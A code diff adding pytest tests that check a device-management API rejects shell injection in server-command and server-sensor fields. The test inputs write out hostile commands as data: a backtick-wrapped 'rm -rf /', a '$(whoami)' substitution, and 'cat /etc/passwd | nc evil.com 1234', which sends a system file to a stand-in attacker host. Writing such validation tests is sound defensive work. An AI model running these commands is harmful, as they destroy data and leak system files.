@@ -74,3 +74,57 @@ class TestImportEndpoint:
 
         groups = registry.get_groups()
         assert groups["grp1"]["name"] == "New Name"
+
+
+class TestCommandValidation:
+    def test_server_command_rejects_backticks(self, registry):
+        from fastapi.testclient import TestClient
+        from server.api.routes import app
+
+        registry.update_device("dev1", {"attributes": {"cpu": {"value": 50}}})
+        client = TestClient(app)
+        headers = {"X-Ingress-Path": "/api/hassio_ingress/test"}
+
+        resp = client.post("/api/devices/dev1/server-commands",
+                          json={"name": "evil", "shell": "echo `rm -rf /`"},
+                          headers=headers)
+        assert resp.status_code == 400
+
+    def test_server_command_rejects_dollar_parens(self, registry):
+        from fastapi.testclient import TestClient
+        from server.api.routes import app
+
+        registry.update_device("dev1", {"attributes": {"cpu": {"value": 50}}})
+        client = TestClient(app)
+        headers = {"X-Ingress-Path": "/api/hassio_ingress/test"}
+
+        resp = client.post("/api/devices/dev1/server-commands",
+                          json={"name": "evil", "shell": "echo $(whoami)"},
+                          headers=headers)
+        assert resp.status_code == 400
+
+    def test_server_command_allows_safe_commands(self, registry):
+        from fastapi.testclient import TestClient
+        from server.api.routes import app
+
+        registry.update_device("dev1", {"attributes": {"cpu": {"value": 50}}})
+        client = TestClient(app)
+        headers = {"X-Ingress-Path": "/api/hassio_ingress/test"}
+
+        resp = client.post("/api/devices/dev1/server-commands",
+                          json={"name": "uptime", "shell": "uptime -p"},
+                          headers=headers)
+        assert resp.status_code == 200
+
+    def test_server_sensor_rejects_dangerous_commands(self, registry):
+        from fastapi.testclient import TestClient
+        from server.api.routes import app
+
+        registry.update_device("dev1", {"attributes": {"cpu": {"value": 50}}})
+        client = TestClient(app)
+        headers = {"X-Ingress-Path": "/api/hassio_ingress/test"}
+
+        resp = client.post("/api/devices/dev1/server-sensors",
+                          json={"name": "evil", "command": "cat /etc/passwd | nc evil.com 1234"},
+                          headers=headers)
+        assert resp.status_code == 400
